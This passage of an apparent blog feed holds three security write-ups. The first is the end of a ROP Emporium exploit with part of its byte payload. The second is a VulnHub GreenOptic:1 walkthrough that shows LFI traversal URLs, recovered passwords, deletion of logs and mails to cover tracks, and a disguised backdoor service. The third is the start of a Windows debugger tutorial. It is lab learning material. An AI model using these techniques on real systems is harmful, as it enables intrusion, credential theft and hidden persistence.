class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00' + b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00')&quot;&lt;/span&gt; | ./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Thank you!
ROPE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will successfully execute our ROP chain and print out our flag!&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.</summary></entry><entry><title type="html">Pentesting GreenOptic: 1</title><link href="http://localhost:4000/2020/07/21/pentesting-greenoptic-1.html" rel="alternate" type="text/html" title="Pentesting GreenOptic: 1" /><published>2020-07-21T00:00:00-04:00</published><updated>2020-07-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/07/21/pentesting-greenoptic-1</id><content type="html" xml:base="http://localhost:4000/2020/07/21/pentesting-greenoptic-1.html">&lt;p&gt;Today, I will be writing up how I solved the &lt;a href=&quot;https://www.vulnhub.com/entry/greenoptic-1,510/#&quot;&gt;GreenOptic: 1&lt;/a&gt; challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As soon as I downloaded the virtual machine and spun it up in &lt;a href=&quot;https://www.virtualbox.org/&quot;&gt;VirtualBox&lt;/a&gt;, I immediately noticed that the target’s hostname was “websrv01,” and it was running CentOS Linux 7. I ran a ping scan in Nmap to find out that the IP address of the virtual machine was 192.168.56.19, and afterwards, I ran an aggressive SYN scan as well (shown below). Ports 21/tcp, 22/tcp, 53/tcp, 80/tcp, and 10000/tcp were open. I tried to login to the FTP server using the anonymous account, but it did not work.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webpage running on port 10000 intrigued me because it is typically not a port used for HTTP, so I went ahead and looked at it. There was a login page for &lt;a href=&quot;http://www.webmin.com/&quot;&gt;Webmin&lt;/a&gt;, which is a web-based interface for Unix system administration.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image26.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to use all of the most obvious passwords (such as admin/admin, root/root, etc.), but after I typed in an incorrect password too many times, the server automatically blocked my IP address. This meant that brute forcing the webpage was not an option. Webmin 1.953 is the latest version of Webmin (at the time of writing this), and no known vulnerabilities existed in its environment. After trying a few more different things, I decided that this was probably not the best attack vector, and I moved on.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image22.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There was another basic webpage running on port 80, so I decided to take a look at that as well. At first glance, it did not seem very interesting. However, using gobuster, I was able to brute force some hidden directories in the website, and I found a hidden login page at /account/.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once again, I tried to use the most obvious passwords, but I had no luck. I moved on and looked more into the website, where I found a directory listing under /img. In the directory listing, I saw two peculiar files: image.dd and testdisk.log. What was a log file and a disk image file doing in a directory filled with pictures?&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image37.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded both the files. The &lt;code class=&quot;highlighter-rouge&quot;&gt;file image.dd&lt;/code&gt; command indicated that image.dd was a BTRFS filesystem image, but I got an error when I tried to use btrfs to look at the file.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a look at the testdisk.log file as well. This file was a log for a data recovery utility called TestDisk.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image29.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I found &lt;a href=&quot;https://www.cgsecurity.org/wiki/TestDisk&quot;&gt;this&lt;/a&gt; off of Google, which seemed to be the same program referenced in the log file, and I used it on the image file.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image24.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I spent a few hours looking trying to use the TestDisk program to extract the files from the disk image file, but I had no luck. I tried to change every single setting, including the partition table type, the sector size, the number of cylinders, and the number of heads, but it appeared as though no matter what I did, I was unable to extract any useful information from the image file. As it turns out, this was a rabbit hole.&lt;/p&gt;

&lt;p&gt;I backtracked a little bit and went back to the login page I found in the /account directory. I noticed that there was an “include” parameter in the URL, and modifying the value of this include parameter could change what was shown on the website. By travelling to http://192.168.56.19/account/index.php?include=../../../../../../../../etc/passwd, I was able to read the contents of /etc/passwd. Using this file, I discovered three new usernames: sam, terry, and alex.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Suddenly, I had an idea: what if I tried to read the emails of the three users that I just found? Going to http://192.168.56.19/account/index.php?include=../../../../../../../../var/mail/terry allowed me to see terry’s emails, which included the following password: wsllsa!2&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the same idea, I was able to read sam’s email as well from http://192.168.56.19/account/index.php?include=../../../../../../../../var/mail/sam. Sam’s email included the following password: HelloSunshine123&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was unable to read alex’s emails (or perhaps he didn’t have any emails). I tried to use the usernames and passwords that I acquired in every login page that I saw earlier, but none of them worked. I couldn’t read /etc/shadow using the LFI, even after I tried common tricks like putting a NULL byte at the end or base64 encoding it. I spun up a web server on my host machine and attempted to exploit an &lt;a href=&quot;https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/&quot;&gt;RFI vulnerability&lt;/a&gt;, but I was also unsuccessful at doing this as the website only allowed local files to be included. Since that didn’t work, I tried to see if I could use a &lt;a href=&quot;https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/&quot;&gt;data stream&lt;/a&gt; to execute PHP code, but that also did not work. I even tried to send an email containing PHP code to terry and sam so that I could potentially read it using the LFI and gain code execution, but something was blocking my emails from being sent.&lt;/p&gt;

&lt;p&gt;At this point, I was hours into doing this challenge, and I was hitting a wall. I wasn’t getting anywhere, so I messaged the challenge writer on discord telling him what I’ve done so far, and he sent me this back:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Have you looked at the DNS server and tried enumerating subdomains? :)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unfortunately, I had gotten so caught up with searching for vulnerabilities in the web servers that I had forgot to do some initial enumeration with the DNS server! Looking back, this was something incredibly obvious that I had missed, and there are no excuses for making such a basic enumeration mistake.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image33.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After doing the zone transfer, I had to add greenoptic.vm, websrv01.greenoptic.vm, root.greenoptic.vm, ns1.greenoptic.vm, and recoveryplan.greenoptic.vm to my hosts file. When I travelled to http://greenoptic.vm, http://websrv01.greentoptic.vm, http://root.greenoptic.vm, and http://ns1.greenoptic.vm, I was greeted with the same website as I saw before. However, when I travelled to http://recoveryplan.greenoptic.vm, I saw something different.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The website required credentials in order to view the webpage. Perhaps there was an .htpasswd file located somewhere?&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image38.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the LFI vulnerability that I found earlier, I was able to see a password hash for a user named “staff” in /var/www/.htpasswd. This hash was easy to brute force using john.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image35.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using the username “staff” and the password “wheeler”, I was able to access the webpage at http://recoveryplan.greenoptic.vm. This website contained a phpBB forum that allowed staff members to post information about their company.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image34.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I clicked on the “Team Message” post made by terry. In his post, terry attached a file called “dpi.zip,” which contained a password-protected PCAP file. I was able to extract the PCAP file by using a password found earlier: HelloSunshine123&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I scrolled through the PCAP file in wireshark, and I eventually found cleartext FTP credentials for alex. His password was FewjAASD1.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After logging into alex’s FTP account, I found one file named “user.txt” in the current directory. This file did not contain any useful information aside from a motivational message that let me know that I was on the right track.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I went back onto the website and registered a user named “notahacker” using the registration form. I had to use sam@websrv01.greenoptic.vm (which I saw earlier) as the email address because the email was required to be in the greenoptic.vm domain.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After creating the account, I was able to create a new post on phpBB that was subtly titled “I’m definitely not a hacker. Just ignore this please.” I included PHP code in the body of the post, thinking that it would allow me to gain code execution on the target machine.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image31.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the website informed me that my post would not be uploaded until I had a moderator approve it.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged into phpBB as terry using “wsllsa!2” as the password. Since terry was a moderator, I was able to approve the post that I had created. Unfortunately, this did not give me any code execution, and I ended up just deleting the page. I scoured the moderator’s settings page, hoping that I could find some setting that could lead me to code execution. It took me a while to realize that I was wasting my time in another rabbit-hole; the FTP credentials that I found earlier also worked for SSH, which gave me a low-priv shell as alex!&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I setup a web server on my host machine that allowed me to easily transfer files to the target machine using wget. After doing some digging and using a few enumeration scripts, I noticed that alex was part of the wireshark group.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image10.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was interesting to me, so I executed tshark (wireshark’s command line equivalent) to look at the packets being sent.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the messages in the packet capture contained “AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28=”, which was base64 decoded as “rootASfojoj2eozxczzmedlmedASASDKoj3o”. Using “ASfojoj2eozxczzmedlmedASASDKoj3o” as the password for root allowed me to obtain root privileges.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image19.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next step was to cover the tracks that I had left while doing the pentest. I went into /var/mail/sam, and I deleted the email that indicated that I created an account on the web server using his email.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had used a few privilege escalation checkers while searching for attack vectors, so I had to delete those from /tmp.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I had also tried using “sudo” several times while I was logged in as alex, which caused me to receive messages saying something along the lines of “alex is not in the sudoers group. This incident will be reported.” I had to delete these incident reports from /var/mail/root.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image27.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The last step was to make sure that I could retain access to the machine even if the root password was changed for some reason. I wanted to test out the &lt;a href=&quot;https://github.com/nihaal-prasad/Basic-Linux-Backdoor&quot;&gt;backdoor&lt;/a&gt; that I recently created, so I transferred it to the target machine using wget. I also renamed the file from “backdoor_server” to “updates” to make it seem less suspicious.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image32.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I created a new service called /etc/systemd/system/update.service that would always execute /.update on boot.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image23.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, I was able to retain access to the target even if it was rebooted and the root user’s password was changed.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image25.png&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be writing up how I solved the GreenOptic: 1 challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.</summary></entry><entry><title type="html">Creating a Barebones Windows Debugger</title><link href="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Windows Debugger" /><published>2020-03-27T00:00:00-04:00</published><updated>2020-03-27T00:00:00-04:00</updated><id>http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the &lt;a href=&quot;https://nihaal-prasad.github.io/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;Linux Debugger&lt;/a&gt; that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static PROCESS_INFORMATION pi = {0}; // Contains information about the debugged process
static int dwContinueStatus = DBG_CONTINUE; // The status for continuing execution
static char cont = 1; // This is set to 0 when the debugger exits

int main(int argc, char** argv) {
    // Initialize some variables
    STARTUPINFO si; // Contains startup information about the debugged process
    ZeroMemory(&amp;amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;amp;pi, sizeof(pi));

    // Create the process to debug
    CreateProcessA(argv[1], NULL, NULL, NULL, 0, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi);

    // Process debugging events
    DEBUG_EVENT debug_event = {0};
    while(cont) {
        if(!WaitForDebugEvent(&amp;amp;debug_event, INFINITE)) {
            break; // Break the loop if the function fails
        }
        ProcessDebugEvent(debug_event); // User-defined function that will process the event
        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, dwContinueStatus); // Continue execution
    }

    // Exit the debugger
    printf(&quot;Debugger will now exit.\n&quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that we need to do is create our main() function, which will create a new child process for debugging. We will do this by using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa&quot;&gt;CreateProcessA()&lt;/a&gt; function, which will allow us to create a process for the program that we wish to debug. This function requires us to pass in two pointers: one pointing to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa&quot;&gt;STARTUPINFO struct&lt;/a&gt; and another pointing to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information&quot;&gt;PROCESS_INFORMATION struct&lt;/a&gt;. Note that the PROCESS_INFORMATION variable is a global variable because we will be using the values in it inside of other functions. The CreateProcessA() function will fill up these two structs with information about the process that we just created.&lt;/p&gt;

&lt;p&gt;Our actual debugger will be executed inside of a while loop, and a global variable called “cont” (one by default) will be set to zero whenever we want to stop the debugger. Whenever certain types of events occurs (such as hitting a breakpoint, for example), the child process pauses execution and notifies the debugger that something called a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/debug/debugging-events&quot;&gt;debugging event&lt;/a&gt; has occurred. Our debugger must continuously wait for debugging events to occur by using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent&quot;&gt;WaitForDebugEvent()&lt;/a&gt; function so that we can take the appropriate action. Note that the WaitForDebugEvent() function returns zero if some kind of error occurs, in which case, we will immidiately stop the debugger. We are required to pass in a pointer to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event&quot;&gt;DEBUG_EVENT&lt;/a&gt; struct to the WaitForDebugEvent() function, which will automatically fill up the struct with information about the debugging event.&lt;/p&gt;

&lt;p&gt;Once some debug event occurs, we will process the event by using the user-defined function ProcessDebugEvent(), whose code I will show a little further below. This function will select the appropriate action for a particular debug event (such as dealing with an exception). After we have finished processing the debugger, we will then continue the debuggee’s execution by calling &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent&quot;&gt;ContinueDebugEvent()&lt;/a&gt;, which is equivalent to using the “continue” command in GDB. The dwContinueStatus variable contains information for how we should be continuing execution, and it should be changed to DBG_EXCEPTION_NOT_HANDLED when we are dealing with breakpoints (more on this later).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct _DEBUG_EVENT {
  DWORD dwDebugEventCode;
  DWORD dwProcessId;
  DWORD dwThreadId;
  union {
    EXCEPTION_DEBUG_INFO      Exception;
    CREATE_THREAD_DEBUG_INFO  CreateThread;
    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
    EXIT_THREAD_DEBUG_INFO    ExitThread;
    EXIT_PROCESS_DEBUG_INFO   ExitProcess;
    LOAD_DLL_DEBUG_INFO       LoadDll;
    UNLOAD_DLL_DEBUG_INFO     UnloadDll;
    OUTPUT_DEBUG_STRING_INFO  DebugString;
    RIP_INFO                  RipInfo;
  } u;
} DEBUG_EVENT, *LPDEBUG_EVENT;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before I show you the code for ProcessDebugEvent(), I need to explain how DEBUG_EVENT stores information. Essentially, there is a value inside of the struct called dwDebugEventCode, which contains a number indicating what kind of debugging event happened. The union variable u will then be filled up with the appropriate information relative for each kind of debug event (for example, if an exception occurs, then we could access information about the exception by using debug_event.u.Exception). This makes it easy for us to figure out what the correct action to take is when we receive a debugging event when dealing with it inside of ProcessDebugEvent().&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void ProcessDebugEvent(DEBUG_EVENT debug_event) {
    // Reset the continue status (in case it was changed while processing an exception)
    dwContinueStatus = DBG_CONTINUE;

    // Call the correct function depending on what the event code is
    switch(debug_event.dwDebugEventCode) {
        case CREATE_PROCESS_DEBUG_EVENT: // Called when the debuggee process is first created
            ProcessCreation(debug_event);
            break;
        case OUTPUT_DEBUG_STRING_EVENT: // Called when a string is sent to the debugger for display
            OutputString(debug_event);
            break;
        case EXCEPTION_DEBUG_EVENT: // Called whenever any exception occurs in the process being debugged
            ProcessException(debug_event);
            break;
        case EXIT_PROCESS_DEBUG_EVENT: // Called when the debuggee process exits
            ExitDebuggeeProcess(debug_event);
            break;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

